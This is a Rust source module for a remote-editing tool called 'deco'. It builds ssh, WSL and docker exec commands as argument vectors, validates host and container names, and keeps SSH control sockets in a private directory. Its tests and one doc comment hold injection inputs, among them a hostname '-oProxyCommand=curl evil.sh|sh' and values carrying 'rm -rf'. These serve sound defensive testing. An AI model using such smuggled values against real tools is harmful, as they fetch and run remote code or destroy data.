//! Turning an authority into a command that runs something on the remote.
//!
//! Every command here is built as an argument vector and handed to the OS
//! directly. Nothing is ever assembled into a shell string, because a hostname
//! or container id can come from a URI someone else wrote — a `deco-remote://`
//! link, a `.code-workspace` file — and `ssh "$host" "$cmd"` with a host of
//! `x; rm -rf ~` is a remote-code-execution bug rather than a quoting bug.

use std::path::{Path, PathBuf};

use crate::authority::Authority;

/// A command to run, as a program and its arguments.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Command {
    /// The program to execute.
    pub program: String,
    /// Its arguments, one element per argument. Never a shell string.
    pub args: Vec<String>,
}

impl Command {
    fn new(program: &str, args: Vec<String>) -> Self {
        Self {
            program: program.to_owned(),
            args,
        }
    }
}

/// Failure to build a transport command.
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum TransportError {
    /// The authority is local, so there is nothing to connect to.
    #[error("the local machine needs no transport")]
    Local,
    /// A hostname or container id contained something that cannot appear in one.
    ///
    /// Rejected rather than escaped: no legitimate hostname or container id
    /// contains a newline or a NUL, and treating one as ordinary text would
    /// mean trusting every downstream tool to quote it correctly.
    #[error("`{value}` is not a valid {field}")]
    InvalidTarget {
        /// What was being validated.
        field: &'static str,
        /// The offending value.
        value: String,
    },
}

/// Rejects targets that cannot legitimately appear in a hostname or id.
fn validate(field: &'static str, value: &str) -> Result<(), TransportError> {
    let bad = value.is_empty()
        || value.starts_with('-')
        || value
            .chars()
            .any(|c| c.is_control() || c == '\0' || c.is_whitespace());
    if bad {
        return Err(TransportError::InvalidTarget {
            field,
            value: value.to_owned(),
        });
    }
    Ok(())
}

/// How deco reaches a remote.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TransportOptions {
    /// Seconds before an SSH connection attempt is abandoned.
    pub connect_timeout_secs: u32,
    /// Where SSH keeps its control socket, or `None` for no multiplexing.
    ///
    /// Multiplexing turns each additional channel into a fast local operation
    /// instead of another authentication round-trip, which matters most for
    /// [`forward`](crate::forward): a browser opening one page can make twenty
    /// connections, and twenty SSH handshakes is not a feature anyone would use.
    ///
    /// It is a path rather than a flag because `ControlMaster` alone does
    /// nothing — OpenSSH's `ControlPath` has no default, and without one the
    /// setting is silently inert. Saying "multiplex: true" and passing no path
    /// is exactly the shape of a claim that is not true, so the type no longer
    /// allows it.
    pub control_path: Option<PathBuf>,
}

impl Default for TransportOptions {
    /// No multiplexing, because working out where to put a socket touches the
    /// filesystem and a `Default` that quietly creates directories is a
    /// surprise. [`TransportOptions::multiplexed`] is the one that does.
    fn default() -> Self {
        Self {
            connect_timeout_secs: 20,
            control_path: None,
        }
    }
}

impl TransportOptions {
    /// The default, plus a control socket in a directory only this account can
    /// use.
    ///
    /// Falls back to no multiplexing rather than to a worse location: a control
    /// socket is a live, authenticated connection to the remote, so a directory
    /// another local user can write to would hand them the session. That is why
    /// the candidates below are only ever the account's own runtime directory or
    /// its `~/.ssh`, and never the shared temporary directory.
    pub fn multiplexed() -> Self {
        Self {
            control_path: control_directory().ok(),
            ..Self::default()
        }
    }
}

/// A private directory for SSH control sockets, created if it is not there.
///
/// Returns an error rather than a fallback when the account has no private
/// directory to offer, or when the one it has is open to anyone else.
fn control_directory() -> Result<PathBuf, std::io::Error> {
    // Windows' `ssh.exe` has no `ControlMaster` at all, so there is nothing to
    // put anywhere and pretending otherwise would add a flag OpenSSH refuses.
    if cfg!(windows) {
        return Err(std::io::Error::other(
            "connection multiplexing is not available on this platform",
        ));
    }
    // `XDG_RUNTIME_DIR` is per-user and 0700 by definition; `~/.ssh` is the
    // other place a control socket conventionally lives. Neither is shared.
    let base = std::env::var_os("XDG_RUNTIME_DIR")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|home| PathBuf::from(home).join(".ssh")))
        .ok_or_else(|| std::io::Error::other("no private directory to keep a control socket in"))?;
    private_directory(&base.join("deco"))
}

/// Creates `directory` if it is not there, and makes sure it is this account's
/// alone.
///
/// Split out from the search above so it can be tested against a directory a
/// test chose, rather than by setting environment variables that every other
/// test in the process shares.
fn private_directory(directory: &Path) -> Result<PathBuf, std::io::Error> {
    let directory = directory.to_path_buf();
    std::fs::create_dir_all(&directory)?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        // The directory may have been there already, and the entire value of
        // this location is that nobody else can reach into it — so it is checked
        // rather than assumed.
        //
        // A symlink is refused outright: following one would put the socket
        // wherever it points, which is the one thing this is choosing a location
        // to avoid.
        if std::fs::symlink_metadata(&directory)?
            .file_type()
            .is_symlink()
        {
            return Err(std::io::Error::other(format!(
                "{} is a symbolic link, and a control socket has to be somewhere                  this account controls",
                directory.display()
            )));
        }
        // This doubles as the ownership check, which is why it is unconditional
        // rather than only when the mode looks wrong: `chmod` succeeds for the
        // owner and fails for everyone else, so a directory belonging to another
        // user fails here instead of being used.
        std::fs::set_permissions(&directory, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(directory)
}

/// Builds the command that runs `remote_command` on `authority`.
///
/// `remote_command` is passed through as separate arguments, so the remote's
/// shell never sees a string deco assembled.
pub fn command_for(
    authority: &Authority,
    remote_command: &[String],
    options: &TransportOptions,
) -> Result<Command, TransportError> {
    match authority {
        Authority::Local => Err(TransportError::Local),

        Authority::Ssh { host, port } => {
            validate("hostname", host)?;
            let mut args = vec![
                "-o".to_owned(),
                format!("ConnectTimeout={}", options.connect_timeout_secs),
                // Batch mode: fail rather than block on a password prompt deco
                // has nowhere to display.
                "-o".to_owned(),
                "BatchMode=yes".to_owned(),
            ];
            if let Some(control_path) = &options.control_path {
                args.extend([
                    "-o".to_owned(),
                    "ControlMaster=auto".to_owned(),
                    "-o".to_owned(),
                    "ControlPersist=600".to_owned(),
                    "-o".to_owned(),
                    // `%C` is a hash of the connection rather than its parts:
                    // socket paths have a length limit near 104 bytes, and a
                    // long hostname under a long home directory quietly exceeds
                    // it.
                    format!("ControlPath={}/%C", control_path.display()),
                ]);
            }
            if let Some(port) = port {
                args.push("-p".to_owned());
                args.push(port.to_string());
            }
            // `--` stops a hostname beginning with `-` being read as a flag.
            args.push("--".to_owned());
            args.push(host.clone());
            args.extend(remote_command.iter().cloned());
            Ok(Command::new("ssh", args))
        }

        Authority::Wsl { distro } => {
            let mut args = Vec::new();
            if let Some(distro) = distro {
                validate("distribution name", distro)?;
                args.push("-d".to_owned());
                args.push(distro.clone());
            }
            args.push("--".to_owned());
            args.extend(remote_command.iter().cloned());
            Ok(Command::new("wsl.exe", args))
        }

        Authority::DevContainer { id } | Authority::AttachedContainer { id } => {
            validate("container id", id)?;
            let mut args = vec![
                "exec".to_owned(),
                // Interactive so stdin reaches the server; no TTY, because the
                // protocol is framed binary rather than a terminal session.
                "-i".to_owned(),
                id.clone(),
            ];
            args.extend(remote_command.iter().cloned());
            Ok(Command::new("docker", args))
        }
    }
}

/// The command that starts deco's headless server on the remote.
///
/// The server speaks the framed protocol over its stdin and stdout, so the
/// transport command above is all that stands between the two ends.
pub fn server_command(server_path: &str, workspace: Option<&str>) -> Vec<String> {
    let mut args = vec![
        server_path.to_owned(),
        "--server".to_owned(),
        "--stdio".to_owned(),
    ];
    if let Some(workspace) = workspace {
        args.push("--workspace".to_owned());
        args.push(workspace.to_owned());
    }
    args
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ssh(authority: &str) -> Command {
        command_for(
            &Authority::parse(authority).unwrap(),
            &["deco".to_owned(), "--server".to_owned()],
            &TransportOptions::default(),
        )
        .unwrap()
    }

    #[test]
    fn without_a_control_path_no_multiplexing_is_claimed() {
        // `ControlMaster=auto` on its own does nothing at all: OpenSSH's
        // `ControlPath` has no default, and without one the setting is silently
        // inert. Emitting it anyway would be asserting a property deco does not
        // have — which is what this used to do.
        let command = ssh("ssh-remote+myhost");
        assert!(
            !command
                .args
                .iter()
                .any(|arg| arg.starts_with("ControlMaster")),
            "{:?}",
            command.args
        );
    }

    #[test]
    fn a_control_path_brings_the_whole_multiplexing_set_with_it() {
        let options = TransportOptions {
            control_path: Some(PathBuf::from("/run/user/1000/deco")),
            ..TransportOptions::default()
        };
        let command = command_for(
            &Authority::parse("ssh-remote+myhost").unwrap(),
            &["deco".to_owned()],
            &options,
        )
        .unwrap();
        assert!(command.args.contains(&"ControlMaster=auto".to_owned()));
        assert!(command.args.contains(&"ControlPersist=600".to_owned()));
        // `%C` rather than the parts of the connection: socket paths have a
        // length limit near 104 bytes that a long hostname quietly exceeds.
        assert!(command
            .args
            .contains(&"ControlPath=/run/user/1000/deco/%C".to_owned()));
    }

    #[cfg(unix)]
    #[test]
    fn a_control_socket_directory_is_this_account_alone() {
        use std::os::unix::fs::PermissionsExt;

        let directory = std::env::temp_dir().join(format!(
            "deco-control-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&directory);

        let made = private_directory(&directory).expect("a directory");
        let mode = std::fs::metadata(&made)
            .expect("metadata")
            .permissions()
            .mode();
        // A control socket is a live authenticated connection to the remote, so
        // a directory anyone else can reach into hands them the session.
        assert_eq!(mode & 0o777, 0o700, "{mode:o}");

        // An existing directory left open is tightened rather than used as it is.
        std::fs::set_permissions(&made, std::fs::Permissions::from_mode(0o755)).expect("loosened");
        private_directory(&directory).expect("a directory");
        assert_eq!(
            std::fs::metadata(&made)
                .expect("metadata")
                .permissions()
                .mode()
                & 0o777,
            0o700
        );

        let _ = std::fs::remove_dir_all(&directory);
    }

    #[cfg(unix)]
    #[test]
    fn a_control_socket_directory_that_is_a_symlink_is_refused() {
        // Following one would put the socket wherever it points, which is the
        // one thing choosing a private location is meant to avoid.
        let base = std::env::temp_dir().join(format!(
            "deco-control-link-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(base.join("elsewhere")).expect("a directory");
        let link = base.join("deco");
        std::os::unix::fs::symlink(base.join("elsewhere"), &link).expect("a symlink");

        let error = private_directory(&link).expect_err("a refusal");
        assert!(error.to_string().contains("symbolic link"), "{error}");

        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn a_local_authority_has_no_transport() {
        assert_eq!(
            command_for(&Authority::Local, &[], &TransportOptions::default()),
            Err(TransportError::Local)
        );
    }

    #[test]
    fn ssh_runs_the_command_on_the_host() {
        let command = ssh("ssh-remote+myhost");
        assert_eq!(command.program, "ssh");
        assert!(command.args.contains(&"myhost".to_owned()));
        // The remote command survives as separate arguments.
        let tail = &command.args[command.args.len() - 2..];
        assert_eq!(tail, ["deco", "--server"]);
    }

    #[test]
    fn ssh_sets_a_connect_timeout_and_refuses_to_block_on_a_password() {
        let command = ssh("ssh-remote+myhost");
        assert!(command.args.contains(&"ConnectTimeout=20".to_owned()));
        assert!(command.args.contains(&"BatchMode=yes".to_owned()));
    }

    #[test]
    fn ssh_passes_a_port_through() {
        let command = ssh("ssh-remote+myhost:2222");
        let position = command.args.iter().position(|a| a == "-p").unwrap();
        assert_eq!(command.args[position + 1], "2222");
    }

    #[test]
    fn a_hostname_is_separated_from_the_options_by_a_double_dash() {
        // Without `--`, a host called `-oProxyCommand=...` would be read as an
        // ssh option — which is a well-known way to turn a URL into command
        // execution.
        let command = ssh("ssh-remote+myhost");
        let dashes = command.args.iter().position(|a| a == "--").unwrap();
        assert_eq!(command.args[dashes + 1], "myhost");
    }

    #[test]
    fn a_hostname_that_looks_like_a_flag_is_rejected_outright() {
        let authority = Authority::Ssh {
            host: "-oProxyCommand=curl evil.sh|sh".into(),
            port: None,
        };
        assert!(matches!(
            command_for(&authority, &[], &TransportOptions::default()),
            Err(TransportError::InvalidTarget {
                field: "hostname",
                ..
            })
        ));
    }

    #[test]
    fn a_hostname_containing_shell_metacharacters_stays_one_argument() {
        // It is never concatenated into a shell string, so it cannot break out;
        // this test pins that the value arrives whole.
        let authority = Authority::Ssh {
            host: "user@host;rm".into(),
            port: None,
        };
        let command = command_for(&authority, &[], &TransportOptions::default()).unwrap();
        assert!(command.args.contains(&"user@host;rm".to_owned()));
    }

    #[test]
    fn a_hostname_with_whitespace_or_control_characters_is_rejected() {
        for host in ["my host", "host\nrm -rf", "host\0", ""] {
            let authority = Authority::Ssh {
                host: host.into(),
                port: None,
            };
            assert!(
                command_for(&authority, &[], &TransportOptions::default()).is_err(),
                "{host:?} should be rejected"
            );
        }
    }

    #[test]
    fn wsl_uses_the_default_distribution_when_none_is_named() {
        let command = command_for(
            &Authority::parse("wsl").unwrap(),
            &["deco".to_owned()],
            &TransportOptions::default(),
        )
        .unwrap();
        assert_eq!(command.program, "wsl.exe");
        assert!(!command.args.contains(&"-d".to_owned()));
        assert_eq!(command.args, ["--", "deco"]);
    }

    #[test]
    fn wsl_selects_a_named_distribution() {
        let command = command_for(
            &Authority::parse("wsl+Ubuntu-22.04").unwrap(),
            &["deco".to_owned()],
            &TransportOptions::default(),
        )
        .unwrap();
        assert_eq!(command.args, ["-d", "Ubuntu-22.04", "--", "deco"]);
    }

    #[test]
    fn containers_are_reached_with_docker_exec() {
        for authority in ["dev-container+abc123", "attached-container+abc123"] {
            let command = command_for(
                &Authority::parse(authority).unwrap(),
                &["deco".to_owned(), "--server".to_owned()],
                &TransportOptions::default(),
            )
            .unwrap();
            assert_eq!(command.program, "docker");
            assert_eq!(command.args, ["exec", "-i", "abc123", "deco", "--server"]);
        }
    }

    #[test]
    fn a_container_id_that_looks_like_a_flag_is_rejected() {
        let authority = Authority::DevContainer {
            id: "--privileged".into(),
        };
        assert!(matches!(
            command_for(&authority, &[], &TransportOptions::default()),
            Err(TransportError::InvalidTarget {
                field: "container id",
                ..
            })
        ));
    }

    #[test]
    fn the_server_command_speaks_over_stdio() {
        assert_eq!(
            server_command("deco", None),
            ["deco", "--server", "--stdio"]
        );
        assert_eq!(
            server_command("/usr/local/bin/deco", Some("/home/u/project")),
            [
                "/usr/local/bin/deco",
                "--server",
                "--stdio",
                "--workspace",
                "/home/u/project"
            ]
        );
    }

    #[test]
    fn a_workspace_path_with_spaces_stays_one_argument() {
        let args = server_command("deco", Some("/home/u/my project"));
        assert_eq!(args.last().unwrap(), "/home/u/my project");
    }
}
